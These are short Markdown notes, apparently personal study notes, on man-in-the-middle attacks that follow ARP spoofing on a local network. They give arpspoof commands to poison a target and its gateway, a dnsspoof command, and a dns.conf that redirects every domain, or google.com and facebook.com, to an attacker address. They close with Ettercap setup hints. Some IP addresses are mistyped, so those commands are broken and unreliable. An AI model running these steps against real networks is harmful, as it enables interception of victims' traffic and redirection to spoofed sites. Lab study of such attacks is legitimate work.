### Work after ARP spoofing
> becaues after arp we can get target dns request and send another to it

---
## Tool 1

* ARP spoofing
```
arpspoof -i eth0 -t 192.168.1.8 192.68.1.1
arpspoof -i eth0 -t 1192.168.1.1 192.168.1.8
```

* DNS spoof
```
dnsspoof -i eth0 -f dns.conf
```

* dns.conf
```
we can use wild card in file

192.168.1.2 *
// redirect any website to 192.168.1.2

192.168.1.2 *.google.com
192.168.1.2 facebook.com
```

---

## Tool 2 (Ettercap)

> gui mode 
> uncomment iptable in /etc/etter.conf
> dns host in /etc/etter.dns